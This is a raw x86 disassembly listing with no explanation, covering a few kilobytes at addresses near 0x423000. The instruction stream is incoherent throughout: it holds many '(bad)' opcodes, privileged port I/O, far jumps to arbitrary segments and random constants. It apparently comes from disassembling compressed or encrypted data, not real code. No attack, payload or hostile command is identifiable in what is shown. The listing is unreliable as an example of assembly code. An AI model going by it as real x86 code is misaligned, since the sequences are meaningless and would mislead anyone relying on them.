  422941:	dec    eax
  422942:	adc    eax,0xa6600467
  422947:	repz push ss
  422949:	test   DWORD PTR [esi+esi*4+0x5c],esi
  42294d:	cmp    ecx,DWORD PTR [ebx+ecx*2]
  422950:	xlat   BYTE PTR ds:[ebx]
  422951:	data16 (bad) 
  422953:	xor    al,0xed
  422955:	aaa    
  422956:	xor    eax,0x5b3b6c73
  42295b:	pop    ebp
  42295c:	add    DWORD PTR [esi],ebx
  42295e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42295f:	into   
  422960:	lock mov bl,0xc0
  422963:	xchg   esi,eax
  422964:	xor    BYTE PTR [edx],dh
  422966:	jne    0x4229d2
  422968:	loop   0x422940
  42296a:	loopne 0x422986
  42296c:	mov    ah,0x28
  42296e:	cmp    al,0x2b
  422970:	leave  
  422971:	shl    ch,1
  422973:	push   0x9ba1462e
  422978:	add    BYTE PTR [eax+0x27],bl
  42297b:	pop    ds
  42297c:	mov    ah,0x1a
  42297e:	fldenv [ecx]
  422980:	sbb    al,0xcd
  422982:	lea    ecx,[edx+0x4b]
  422985:	cmc    
  422986:	aaa    
  422987:	adc    BYTE PTR [ebx+0x40],bl
  42298a:	aaa    
  42298b:	addr16 mov bl,0xb2
  42298e:	ss add dl,bh
  422991:	and    bh,BYTE PTR [esi-0x12b8970d]
  422997:	jmp    0xfbb7:0x891e14ac
  42299e:	shl    ebp,1
  4229a0:	loop   0x422a1b
  4229a2:	mov    bl,0x8e
  4229a4:	or     eax,0x46239965
  4229a9:	cli    
  4229aa:	loop   0x422993
  4229ac:	fmulp  st(1),st
  4229ae:	cwde   
  4229af:	sub    eax,0x46f0f54d
  4229b4:	cmp    eax,0x320d6c96
  4229b9:	in     eax,dx
  4229ba:	mov    ds:0x5fdfd7a3,al
  4229bf:	pushf  
  4229c0:	cmp    DWORD PTR [edx-0x78],esp
  4229c3:	jmp    0x422a0a
  4229c5:	inc    ebx
  4229c6:	jl     0x4229d3
  4229c8:	mov    ah,0xd0
  4229ca:	retf   
  4229cb:	outs   dx,DWORD PTR ds:[esi]
  4229cc:	call   0xda62a9ba
  4229d1:	mov    esi,0xe80e755d
  4229d6:	inc    edx
  4229d7:	pushf  
  4229d8:	dec    ecx
  4229d9:	out    0xd0,al
  4229db:	repz lock cld 
  4229de:	pushf  
  4229df:	mov    DWORD PTR [ebx-0x27],edx
  4229e2:	mov    al,ds:0xd939c287
  4229e7:	push   es
  4229e8:	dec    eax
  4229e9:	arpl   WORD PTR [esi],di
  4229eb:	push   eax
  4229ec:	cmp    BYTE PTR [eax+eiz*2],bh
  4229ef:	ds stc 
  4229f1:	cli    
  4229f2:	adc    BYTE PTR [esi+0x2],bh
  4229f5:	add    BYTE PTR [esi+0x18],bh
  4229f8:	dec    esi
  4229f9:	je     0x422a17
  4229fb:	test   al,0xbb
  4229fd:	and    BYTE PTR [eax],ah
  4229ff:	push   0x73
  422a01:	mov    eax,ds:0x3c65b257
  422a06:	dec    edx
  422a07:	fcmovne st,st(1)
  422a09:	out    0x25,eax
  422a0b:	mov    ah,0x12
  422a0d:	xchg   BYTE PTR [eax],al
	...
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	push   cs
  422a27:	stos   DWORD PTR es:[edi],eax
  422a28:	jae    0x422aa3
  422a2a:	les    esp,FWORD PTR [ecx+eax*1+0x1fc00]
  422a31:	add    BYTE PTR [ecx],cl
  422a33:	mov    bh,ch
  422a35:	or     cl,BYTE PTR [edi+0x762ccf21]
  422a3b:	add    ecx,esi
  422a3d:	adc    al,0x9d
  422a3f:	mov    eax,ds:0x8253358e
  422a44:	(bad)  
  422a45:	jmp    0x3567c716
  422a4a:	adc    al,0x9e
  422a4c:	push   ebx
  422a4d:	adc    edx,DWORD PTR [eax+0x1e777b3e]
  422a53:	int    0xda
  422a55:	imul   edi,DWORD PTR [edi-0x3e],0xa4ee5c60
  422a5c:	jb     0x422a53
  422a5e:	xchg   edi,eax
  422a5f:	add    DWORD PTR [ebx-0x75],ebx
  422a62:	add    bh,BYTE PTR [ebx]
  422a64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a65:	or     DWORD PTR [ecx],edi
  422a67:	jb     0x422a24
  422a69:	cld    
  422a6a:	pop    es
  422a6b:	cmp    BYTE PTR [esi+0x1df4d0ea],0x7f
  422a72:	sub    BYTE PTR ds:0x8e359f9d,0x1f
  422a79:	xor    BYTE PTR [eax+ecx*2+0xbf5bc90],ch
  422a80:	mov    esi,0x37e2d1c4
  422a85:	fcom   QWORD PTR [eax+0x55]
  422a88:	lds    edi,FWORD PTR [esi+0x75020586]
  422a8e:	or     BYTE PTR [eax+0x44],0x8
  422a92:	lds    edi,FWORD PTR [esi]
  422a94:	in     eax,0xd7
  422a96:	cmp    esp,edi
  422a98:	test   eax,0xc5d6e49
  422a9d:	ins    DWORD PTR es:[edi],dx
  422a9e:	leave  
  422a9f:	mov    ds,WORD PTR [eax-0x42]
  422aa2:	in     al,dx
  422aa3:	leave  
  422aa4:	and    eax,0xd553025a
  422aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aaa:	mov    cl,0xff
  422aac:	cwde   
  422aad:	retf   
  422aae:	sub    eax,0xea86e455
  422ab3:	in     eax,dx
  422ab4:	mov    ds:0x364d9959,eax
  422ab9:	jmp    0x8f3f:0x3a1cb587
  422ac0:	adc    DWORD PTR [ecx],esp
  422ac2:	enter  0xe083,0x8
  422ac6:	ret    
  422ac7:	push   edx
  422ac8:	pop    edx
  422ac9:	popf   
  422aca:	add    eax,esi
  422acc:	mov    ds:0xb7be795,eax
  422ad1:	cmp    bh,BYTE PTR [edx+0x45a80fd8]
  422ad7:	or     esi,DWORD PTR gs:0x892f0b2
  422ade:	mov    DWORD PTR [esi+ebp*8-0x6f8e3c1e],esp
  422ae5:	mov    cl,0x12
  422ae7:	jmp    0x422ade
  422ae9:	pop    es
  422aea:	aam    0x10
  422aec:	inc    ebx
  422aed:	adc    dh,BYTE PTR [edi-0x45]
  422af0:	(bad)  [eax+ecx*1+0x5400a815]
  422af7:	in     al,dx
  422af8:	push   ss
  422af9:	mov    bh,0xee
  422afb:	shr    DWORD PTR [ecx+0x3c],1
  422afe:	sub    ebp,DWORD PTR [ebx]
  422b00:	int3   
  422b01:	sbb    al,BYTE PTR [eax]
  422b03:	push   ds
  422b04:	xor    esp,ebx
  422b06:	fcmovnu st,st(7)
  422b08:	cli    
  422b09:	xchg   edi,eax
  422b0a:	mov    DWORD PTR [edi+0x209067b9],eax
  422b10:	ss jo  0x422b5e
  422b13:	js     0x422aaa
  422b15:	push   cs
  422b16:	and    al,bl
  422b18:	and    bh,cl
  422b1a:	xchg   ebp,eax
  422b1b:	push   es
  422b1c:	sbb    dh,bl
  422b1e:	mov    ebp,0x72bbc168
  422b23:	adc    BYTE PTR [ebx-0x50ebbaeb],bh
  422b29:	les    edx,FWORD PTR ds:0x16cb8fc4
  422b2f:	xchg   DWORD PTR [edi+0x23277a4e],esp
  422b35:	fisttp WORD PTR [ebp+0x1c]
  422b38:	cdq    
  422b39:	pop    ds
  422b3a:	imul   ecx,ebx,0xffffffa5
  422b3d:	xchg   dh,dh
  422b3f:	clc    
  422b40:	pop    eax
  422b41:	hlt    
  422b42:	push   ebp
  422b43:	(bad)  
  422b44:	daa    
  422b45:	test   al,0x1e
  422b47:	loopne 0x422baa
  422b49:	mov    bh,0xa2
  422b4b:	(bad)  
  422b4c:	fild   QWORD PTR [ecx+0xf]
  422b4f:	ins    DWORD PTR es:[edi],dx
  422b50:	out    0x20,al
  422b52:	mov    esi,0x51132308
  422b57:	xor    ch,al
  422b59:	adc    al,0x9f
  422b5b:	push   esp
  422b5c:	jle    0x422b24
  422b5e:	mov    edi,DWORD PTR [eax+0x36f83ca4]
  422b64:	and    al,0xf5
  422b66:	sub    eax,0x848f1bf3
  422b6b:	push   0x9fbd4ee6
  422b70:	(bad)  
  422b71:	pop    edi
  422b72:	imul   edi,DWORD PTR [edi],0x518c9ebf
  422b78:	sbb    esp,0xffffffbe
  422b7b:	ins    BYTE PTR es:[edi],dx
  422b7c:	or     ebp,DWORD PTR [edx-0x14ad5996]
  422b82:	aad    0x45
  422b84:	xor    eax,0xe00637cc
  422b89:	js     0x422be1
  422b8b:	jb     0x422bcd
  422b8d:	daa    
  422b8e:	lds    esi,FWORD PTR [ebp-0x71]
  422b91:	push   ss
  422b92:	inc    edi
  422b93:	icebp  
  422b94:	aas    
  422b95:	sub    eax,edx
  422b97:	test   al,0x30
  422b99:	aaa    
  422b9a:	cmp    DWORD PTR [edi-0x7b],edi
  422b9d:	mov    ch,0x42
  422b9f:	repnz cmp dl,BYTE PTR ss:[esi+0x5cb11020]
  422ba7:	push   ecx
  422ba8:	inc    ebp
  422ba9:	stos   DWORD PTR es:[edi],eax
  422baa:	aad    0x9
  422bac:	popa   
  422bad:	mov    al,BYTE PTR [ebx+0x14]
  422bb0:	div    BYTE PTR [edx+0x49]
  422bb3:	push   ebp
  422bb4:	add    DWORD PTR [esi],0xfb35bd0
  422bba:	add    eax,0xa85fbe45
  422bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bc0:	mov    dl,0x27
  422bc2:	jb     0x422bbd
  422bc4:	mov    ebp,0x9a7dc385
  422bc9:	mov    ebx,DWORD PTR [esi+0x5e]
  422bcc:	in     eax,0xb2
  422bce:	mov    bh,0x1e
  422bd0:	jae    0x422ba9
  422bd2:	inc    esp
  422bd3:	imul   edi,DWORD PTR [eax],0x75c245bd
  422bd9:	cs lahf 
  422bdb:	cmp    bh,BYTE PTR [edi-0x5dbf307f]
  422be1:	call   0xfaa6:0x232a7686
  422be8:	dec    esp
  422be9:	inc    DWORD PTR [edi-0x6e]
  422bec:	add    bh,dh
  422bee:	cmp    BYTE PTR [eax+esi*2+0x58],0xb4
  422bf3:	imul   DWORD PTR [ebp+0x47]
  422bf6:	fwait
  422bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bf8:	xchg   DWORD PTR [ebp-0x6a878c56],edx
  422bfe:	dec    esp
  422bff:	jnp    0x422c54
  422c01:	jnp    0x422c50
  422c03:	out    0x61,al
  422c05:	pop    ebx
  422c06:	mov    esi,0x8955ca81
  422c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c0c:	sub    al,0x2e
  422c0e:	(bad)  
  422c0f:	push   esi
  422c10:	sahf   
  422c11:	fisubr DWORD PTR [ebp+0x263751f8]
  422c17:	clc    
  422c18:	fimul  DWORD PTR [edi]
  422c1a:	or     BYTE PTR [edi-0x5647e5cd],dh
  422c20:	pop    ebp
  422c21:	leave  
  422c22:	jne    0x422bae
  422c24:	les    edx,FWORD PTR [edx+0x2d81c2d1]
  422c2a:	aaa    
  422c2b:	mov    cl,BYTE PTR [eax+0xb0]
	...
  422c39:	add    BYTE PTR ds:0xbf06168e,dh
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    esi,DWORD PTR [eax]
  422c47:	les    ecx,FWORD PTR [ecx+0x1a6c05c]
  422c4d:	add    ah,bh
  422c4f:	add    DWORD PTR [eax],eax
  422c51:	add    BYTE PTR [ebp+0x6c],dl
  422c54:	mov    ebx,0x7c83a9e9
  422c59:	xchg   ecx,eax
  422c5a:	inc    edi
  422c5b:	or     eax,DWORD PTR [ebx]
  422c5d:	test   DWORD PTR [ebx],esi
  422c5f:	mov    ch,0xd3
  422c61:	test   al,0xf3
  422c64:	and    edi,edx
  422c66:	sub    BYTE PTR [ebx],0x4b
  422c69:	mov    ebx,0x29221645
  422c6e:	inc    ecx
  422c6f:	ror    ah,0x44
  422c72:	outs   dx,BYTE PTR ds:[esi]
  422c73:	mov    ds:0x6cb07024,eax
  422c78:	loopne 0x422cdf
  422c7a:	mov    ecx,0x5f035dbf
  422c7f:	or     esi,DWORD PTR [ecx+0x10]
  422c82:	gs jbe 0x422c64
  422c85:	test   esi,edi
  422c87:	dec    DWORD PTR [edi-0x411bbeb9]
  422c8d:	xchg   BYTE PTR [esi+0x6df58501],ch
  422c93:	jp     0x422ce6
  422c95:	mov    al,0xf
  422c97:	fmul   DWORD PTR [ebp+0x3a131461]
  422c9d:	pushf  
  422c9e:	div    BYTE PTR [esi-0x74]
  422ca1:	mov    edi,0x7b9ed7e2
  422ca6:	pusha  
  422ca7:	and    al,0x95
  422ca9:	mov    al,ds:0x827764ba
  422cae:	xchg   ecx,eax
  422caf:	jbe    0x422c39
  422cb1:	and    al,0x6d
  422cb3:	jp     0x422c43
  422cb5:	inc    eax
  422cb6:	cmp    al,0x5a
  422cb8:	mov    edi,0xee5077c4
  422cbd:	std    
  422cbe:	int3   
  422cbf:	dec    eax
  422cc0:	hlt    
  422cc1:	inc    ecx
  422cc2:	iret   
  422cc3:	xor    DWORD PTR [edi+0x2d08679f],edx
  422cc9:	sub    eax,0x521fc16
  422cce:	push   ss
  422ccf:	not    BYTE PTR cs:[edx+0x66d6f81c]
  422cd6:	cmp    DWORD PTR [ecx+0x4e],ecx
  422cd9:	and    DWORD PTR [eax-0x7c],0xffffffe6
  422cdd:	and    DWORD PTR [edi],0xfffffffd
  422ce0:	sbb    BYTE PTR [ecx+0x77],bl
  422ce3:	mov    cl,0xb2
  422ce6:	and    BYTE PTR [ecx-0x3c6fd3cd],al
  422cec:	shr    ch,0x3e
  422cef:	jg     0x422d69
  422cf1:	dec    edx
  422cf2:	and    edx,ebp
  422cf4:	ins    DWORD PTR es:[edi],dx
  422cf5:	stos   BYTE PTR es:[edi],al
  422cf6:	popa   
  422cf7:	push   es
  422cf8:	sub    DWORD PTR ds:[ebp+0x5387b251],edi
  422cff:	clc    
  422d00:	adc    BYTE PTR [edx+ebx*1],ah
  422d03:	or     al,0x20
  422d05:	xlat   BYTE PTR ds:[ebx]
  422d06:	(bad)  
  422d07:	in     eax,0x3e
  422d09:	fild   WORD PTR [esi-0x22]
  422d0c:	add    BYTE PTR [ebx+0x564b6cfa],dl
  422d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d13:	jb     0x422d8c
  422d15:	lds    ebp,FWORD PTR [ecx-0x3195d78]
  422d1b:	xchg   ebx,eax
  422d1c:	out    0xc0,al
  422d1e:	pop    ss
  422d1f:	push   edi
  422d20:	xchg   ecx,ebp
  422d22:	cmp    cl,BYTE PTR [esi]
  422d24:	push   ecx
  422d25:	sbb    al,BYTE PTR [eax]
  422d27:	adc    ecx,eax
  422d29:	or     ebp,esi
  422d2b:	jae    0x422cea
  422d2d:	dec    esi
  422d2e:	ja     0x422d47
  422d30:	ins    DWORD PTR es:[edi],dx
  422d31:	imul   ebp,edx,0x3a203135
  422d37:	xor    BYTE PTR [ebx-0x56],dh
  422d3a:	xor    eax,0x45517cde
  422d3f:	dec    eax
  422d40:	push   esi
  422d41:	sbb    eax,DWORD PTR [edi+0x7b]
  422d44:	leave  
  422d45:	imul   ecx,DWORD PTR [esi+0x31],0xa54ef9a0
  422d4c:	push   eax
  422d4d:	aad    0x1d
  422d4f:	out    dx,eax
  422d50:	push   es
  422d51:	xlat   BYTE PTR ds:[ebx]
  422d52:	mov    ebp,0x3f49b183
  422d57:	mov    dh,0xa0
  422d59:	mov    ds:0xce88375,eax
  422d5e:	lods   al,BYTE PTR ds:[esi]
  422d5f:	sub    BYTE PTR [edx-0x19639d05],al
  422d65:	xchg   ecx,eax
  422d66:	clc    
  422d67:	fwait
  422d68:	mov    WORD PTR [ebx-0x4d56cb83],ds
  422d6e:	imul   ebx,esp,0x12781db1
  422d74:	rep stos DWORD PTR es:[edi],eax
  422d76:	(bad)  
  422d77:	pop    ebx
  422d78:	dec    DWORD PTR [edx-0x1a]
  422d7b:	fcomi  st,st(6)
  422d7d:	and    DWORD PTR [edi],eax
  422d7f:	test   al,0x41
  422d81:	in     eax,dx
  422d82:	xor    eax,0x41103d58
  422d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d88:	bound  eax,QWORD PTR [eax+esi*4]
  422d8b:	mov    gs,ebp
  422d8d:	dec    edi
  422d8e:	xchg   ecx,eax
  422d8f:	mov    eax,0x795f4c74
  422d94:	jne    0x422db6
  422d96:	aas    
  422d97:	pusha  
  422d98:	cwde   
  422d99:	mov    bh,0xa6
  422d9b:	xor    bl,ah
  422d9d:	pop    edi
  422d9e:	pop    esp
  422d9f:	mov    esi,0xc2f9a5a0
  422da4:	inc    esi
  422da5:	test   eax,0xa2ecba71
  422daa:	lds    edx,FWORD PTR [edx+0x25]
  422dad:	inc    esp
  422dae:	jo     0x422d4f
  422db0:	push   esp
  422db1:	iret   
  422db2:	push   0x9b0229
  422db7:	dec    edx
  422db8:	xchg   esi,eax
  422db9:	rol    DWORD PTR [edi+0x75],cl
  422dbc:	ja     0x422d88
  422dbe:	mov    ebp,DWORD PTR [esi+ebx*1]
  422dc1:	jge    0x422de9
  422dc3:	loop   0x422e0d
  422dc5:	or     al,0x6c
  422dc7:	outs   dx,DWORD PTR ds:[esi]
  422dc8:	bsf    esp,DWORD PTR [ecx+0x78f8db73]
  422dcf:	cmp    ch,BYTE PTR [edi-0xcf4a79b]
  422dd5:	or     al,0x7e
  422dd7:	repnz ficom WORD PTR [esi+0x35]
  422ddb:	jae    0x422df0
  422ddd:	loope  0x422d64
  422ddf:	dec    edi
  422de0:	retf   
  422de1:	fstp   TBYTE PTR [edx+ebp*8-0x1a60ab78]
  422de8:	scas   al,BYTE PTR es:[edi]
  422de9:	vcvtss2sd xmm5,xmm7,DWORD PTR [esi-0x172aa62e]
  422df1:	clc    
  422df2:	and    ah,BYTE PTR [edi]
  422df4:	jp     0x422e2c
  422df6:	xor    DWORD PTR [ecx-0xd5b7342],edi
  422dfc:	pop    ebx
  422dfd:	push   edx
  422dfe:	jle    0x422e46
  422e00:	(bad)  
  422e01:	in     eax,dx
  422e02:	int3   
  422e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e04:	adc    al,0xa3
  422e06:	outs   dx,DWORD PTR ds:[esi]
  422e07:	ret    
  422e08:	and    ah,0x8e
  422e0b:	in     al,0x48
  422e0d:	shr    ah,cl
  422e0f:	xchg   edx,eax
  422e10:	fisubr DWORD PTR [ebp+0x5]
  422e13:	scas   al,BYTE PTR es:[edi]
  422e14:	push   es
  422e15:	push   edx
  422e16:	cmp    al,0x2b
  422e18:	(bad)  
  422e19:	pop    ds
  422e1a:	ror    DWORD PTR [ebx-0x63bfa012],0xc0
  422e21:	fist   DWORD PTR [ecx]
  422e23:	fidivr DWORD PTR [edi-0x30e23400]
  422e29:	pop    ss
  422e2a:	sahf   
  422e2b:	popa   
  422e2c:	cmp    eax,0xd8d056c2
  422e31:	hlt    
  422e32:	and    BYTE PTR [edi],ch
  422e34:	(bad)  
  422e35:	inc    ebp
  422e36:	cwde   
  422e37:	ror    BYTE PTR [eax+0x13],1
  422e3a:	in     al,dx
  422e3b:	xchg   ebp,eax
  422e3c:	hlt    
  422e3d:	dec    eax
  422e3e:	(bad)  
  422e3f:	fdivr  st(4),st
  422e41:	add    eax,DWORD PTR [ecx-0x289133e1]
  422e47:	in     al,0x6a
  422e49:	bound  edi,QWORD PTR ds:0x627d4a
	...
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    cl,bh
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi-0x6558013c]
  422e68:	or     DWORD PTR [esp+edi*4-0x58],ebp
  422e6c:	add    DWORD PTR [eax],eax
  422e6e:	cld    
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [ebp+0x7460ed67],bl
  422e77:	and    al,ah
  422e79:	cmp    BYTE PTR [bp+di],0xe
  422e7d:	test   edi,esp
  422e7f:	arpl   WORD PTR [ecx-0x1c],bx
  422e82:	inc    edi
  422e83:	xchg   ecx,eax
  422e84:	xlat   BYTE PTR ds:[ebx]
  422e85:	xchg   DWORD PTR [edi-0x41],edx
  422e88:	dec    edi
  422e89:	and    DWORD PTR [ebp+0x3],esp
  422e8c:	push   0x52
  422e8e:	lods   al,BYTE PTR ds:[esi]
  422e8f:	pop    eax
  422e90:	es (bad) 
  422e92:	fisubr WORD PTR [edi-0x4b]
  422e95:	gs adc eax,0x1cb53e07
  422e9b:	push   ebp
  422e9c:	call   0x14522072
  422ea1:	int    0x95
  422ea3:	push   edi
  422ea4:	stos   DWORD PTR es:[edi],eax
  422ea5:	retf   
  422ea6:	inc    ebx
  422ea7:	in     eax,dx
  422ea8:	outs   dx,BYTE PTR ds:[esi]
  422ea9:	sbb    eax,0x13f63d2f
  422eae:	jmp    0x843e:0x26f28275
  422eb5:	(bad)  
  422eb6:	jnp    0x422e6a
  422eb8:	cmp    esp,esi
  422eba:	fwait
  422ebb:	pop    edx
  422ebc:	jmp    0xc02557a9
  422ec1:	push   0x3eed35c8
  422ec6:	popa   
  422ec7:	push   eax
  422ec8:	xor    BYTE PTR [eax+eiz*8-0x12],al
  422ecc:	repz push es
  422ece:	jmp    0x74867858
  422ed3:	push   0x71
  422ed5:	icebp  
  422ed6:	pushf  
  422ed7:	jg     0x422f1a
  422ed9:	(bad)  
  422eda:	pop    ebp
  422edb:	push   edi
  422edc:	test   DWORD PTR [ecx],edx
  422ede:	mov    esp,0xceec6cf3
  422ee3:	mov    ecx,0x9d955479
  422ee8:	dec    edi
  422ee9:	push   0xfe318d0e
  422eee:	and    edi,DWORD PTR [edi+0x77]
  422ef1:	adc    bh,BYTE PTR es:[edx]
  422ef4:	sar    BYTE PTR [eax-0x536298ad],1
  422efa:	push   esp
  422efb:	int    0xb
  422efd:	or     edi,DWORD PTR [edx]
  422eff:	mov    al,0xd2
  422f01:	jg     0x422e8f
  422f03:	push   eax
  422f04:	inc    esp
  422f05:	mov    ch,0x28
  422f07:	dec    esp
  422f08:	pop    esi
  422f09:	fdiv   QWORD PTR [esi-0x1f1a8a3e]
  422f0f:	stc    
  422f10:	xchg   ebp,eax
  422f11:	das    
  422f12:	jle    0x422ef8
  422f14:	arpl   WORD PTR [eax-0x3335fec1],bx
  422f1a:	mov    bl,0x6d
  422f1c:	out    dx,eax
  422f1d:	gs jle 0x422eeb
  422f20:	cmc    
  422f21:	lahf   
  422f22:	jmp    0x8a21:0x2a8719b3
  422f29:	fnstcw WORD PTR [ebp+0x3d0b5705]
  422f2f:	mov    DWORD PTR [edx+0x95fc555],edi
  422f35:	repz int 0x38
  422f38:	pop    esi
  422f39:	inc    edx
  422f3a:	cli    
  422f3b:	bound  ebp,QWORD PTR [eax+0x43]
  422f3e:	or     ecx,eax
  422f40:	dec    ebx
  422f41:	cld    
  422f42:	popa   
  422f43:	mov    ds:0x669846cd,eax
  422f48:	sbb    ch,BYTE PTR [edi-0x32]
  422f4b:	push   ds
  422f4c:	dec    esi
  422f4d:	jne    0x422ee5
  422f4f:	pop    ds
  422f50:	js     0x422fb0
  422f52:	inc    edx
  422f53:	pop    eax
  422f54:	push   esi
  422f55:	add    eax,DWORD PTR [edi-0x3233623f]
  422f5b:	cmp    al,0xdc
  422f5d:	cdq    
  422f5e:	outs   dx,BYTE PTR ds:[esi]
  422f5f:	push   0x50cb261f
  422f64:	inc    edx
  422f65:	xor    eax,0xd33bec35
  422f6a:	cli    
  422f6b:	push   cs
  422f6c:	mov    al,ds:0x17a322de
  422f71:	icebp  
  422f72:	mov    dl,0x97
  422f74:	scas   eax,DWORD PTR es:[edi]
  422f75:	fwait
  422f76:	jmp    0x5aba9a5c
  422f7b:	in     al,dx
  422f7c:	sbb    BYTE PTR [edi+ebp*8-0x2],bh
  422f80:	ins    BYTE PTR es:[edi],dx
  422f81:	popa   
  422f82:	pop    edx
  422f83:	ds pop ebx
  422f85:	cmp    esp,ebp
  422f87:	test   eax,0x5b7377a7
  422f8c:	pop    ebx
  422f8d:	sbb    DWORD PTR [ecx],esi
  422f8f:	add    DWORD PTR [edi+esi*4+0x5d],esi
  422f93:	popa   
  422f94:	pop    ebp
  422f95:	out    0x69,eax
  422f97:	mov    ch,0x74
  422f99:	fild   DWORD PTR [esi-0x6e6a6489]
  422f9f:	xchg   ebp,eax
  422fa0:	adc    BYTE PTR [eax],al
  422fa2:	adc    eax,0xd061a016
  422fa7:	fbld   TBYTE PTR [edx+0x2326dcc]
  422fad:	push   esp
  422fae:	pop    esi
  422faf:	jo     0x422f53
  422fb1:	mov    WORD PTR [edx-0x7119c3],ss
  422fb7:	ins    BYTE PTR es:[edi],dx
  422fb8:	inc    esi
  422fb9:	fcomp  DWORD PTR [edi-0x78]
  422fbc:	rol    BYTE PTR [ebx-0x60269811],0xb7
  422fc3:	fcomp  QWORD PTR [edx-0x2e746ea7]
  422fc9:	dec    ebp
  422fca:	lea    edx,[bx+si]
  422fcd:	add    eax,0x9f01ce3b
  422fd2:	les    ebx,FWORD PTR [edi-0x79]
  422fd5:	push   ss
  422fd6:	xchg   edi,eax
  422fd7:	fwait
  422fd8:	and    esp,ecx
  422fda:	test   al,0x95
  422fdc:	aad    0x9b
  422fde:	cmp    edi,DWORD PTR [ecx-0x39c3cfc0]
  422fe4:	in     al,dx
  422fe5:	cmp    eax,0xae2f987
  422fea:	cli    
  422feb:	adc    bh,BYTE PTR [eax+0x10]
  422fee:	dec    ecx
  422fef:	das    
  422ff0:	mov    ch,0xc8
  422ff2:	jns    0x422f87
  422ff4:	and    al,0x83
  422ff6:	outs   dx,DWORD PTR ds:[esi]
  422ff7:	pop    eax
  422ff8:	inc    esp
  422ff9:	mov    bh,0x1e
  422ffb:	pusha  
  422ffc:	in     al,dx
  422ffd:	xchg   esp,eax
  422ffe:	pslld  mm1,QWORD PTR [ecx-0x79cbb29e]
  423005:	jl     0x422f98
  423007:	sbb    al,BYTE PTR [ebx-0x76]
  42300a:	call   0x463:0x34d09752
  423011:	in     al,dx
  423012:	mov    ds:0xe60e59ff,al
  423017:	mov    ebx,0xa9ce813b
  42301c:	sti    
  42301d:	retf   0x58d3
  423020:	popa   
  423021:	mov    al,0xa6
  423023:	or     al,0x7e
  423025:	mov    esp,0x6b20a8ca
  42302a:	mov    bl,0x31
  42302c:	jl     0x422fb4
  42302e:	add    eax,0x5168032f
  423033:	repnz idiv BYTE PTR [eax-0x713eb248]
  42303a:	imul   edx,DWORD PTR [ecx-0x33],0x32
  42303e:	cmp    DWORD PTR [edx+0x11],edi
  423041:	cmp    BYTE PTR [ecx-0x67],al
  423044:	push   edi
  423045:	cli    
  423046:	loopne 0x4230a8
  423048:	mov    bh,0x69
  42304a:	jge    0x422fe9
  42304c:	addr16 arpl dx,sp
  42304f:	leave  
  423050:	sbb    edi,ebx
  423052:	jl     0x42305e
  423054:	dec    edx
  423055:	xor    BYTE PTR [edx+ebx*8],cl
  423058:	mov    DWORD PTR [esi],edx
  42305a:	mov    ah,0xff
  42305c:	cmp    al,0x40
  42305e:	movntps XMMWORD PTR [eax],xmm4
  423061:	add    BYTE PTR [ebp-0x23],al
  423064:	push   ss
  423065:	cwde   
  423066:	cmp    al,BYTE PTR [ecx+ebx*2+0x775457f7]
  42306d:	js     0x42306f
	...
  423077:	add    BYTE PTR [eax],al
  423079:	add    dl,dh
  42307b:	rol    BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	les    esi,FWORD PTR [ecx]
  423088:	add    ch,BYTE PTR [eax+edi*4-0x3fffe56]
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    BYTE PTR [esi+0x68],ch
  423094:	daa    
  423095:	aam    0xc4
  423097:	add    DWORD PTR ds:0xf6cd5d03,ebx
  42309d:	imul   ebp,DWORD PTR [esi-0x18],0x1
  4230a1:	xor    dl,BYTE PTR [edx+0x4e]
  4230a4:	stc    
  4230a5:	push   cs
  4230a6:	imul   edx,DWORD PTR [esi-0x116e916c],0xe763bedd
  4230b0:	add    ebx,ebp
  4230b2:	retf   
  4230b3:	jl     0x423100
  4230b5:	call   0xc0a66f8d
  4230ba:	sub    al,0x85
  4230bc:	inc    edi
  4230bd:	bound  esp,QWORD PTR [edx+ebx*2+0x5]
  4230c1:	mov    ch,0x83
  4230c3:	jns    0x423079
  4230c5:	add    eax,0xdbc17c3a
  4230ca:	fild   DWORD PTR [esi-0x29fc2f4f]
  4230d0:	scas   eax,DWORD PTR es:[edi]
  4230d1:	int    0x48
  4230d3:	adc    DWORD PTR [ecx+0xd],ecx
  4230d6:	xchg   ebp,eax
  4230d7:	xor    al,0x9
  4230d9:	sbb    edx,edi
  4230db:	mov    edx,0xa6bfa81b
  4230e0:	mov    al,ds:0x4c77e16a
  4230e5:	add    DWORD PTR [ebx],0xda82a253
  4230eb:	cmp    BYTE PTR [eax],al
  4230ed:	mov    edi,0x2ce62045
  4230f2:	and    cl,BYTE PTR [esi]
  4230f4:	push   ebx
  4230f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230f6:	sbb    BYTE PTR [esi-0x32],ch
  4230f9:	adc    eax,0xb3126ba3
  4230fe:	imul   esi,ebp,0x4b
  423101:	push   ecx
  423102:	xor    edi,DWORD PTR [ebx+eiz*1+0x18]
  423106:	test   BYTE PTR [esi],bh
  423108:	ret    
  423109:	inc    eax
  42310a:	pop    ebx
  42310b:	or     DWORD PTR [ebp-0x18021a91],esi
  423111:	fwait
  423112:	and    eax,esi
  423114:	push   0x39
  423116:	jle    0x4230b5
  423118:	(bad)  
  423119:	mov    bh,0x3e
  42311b:	jl     0x423118
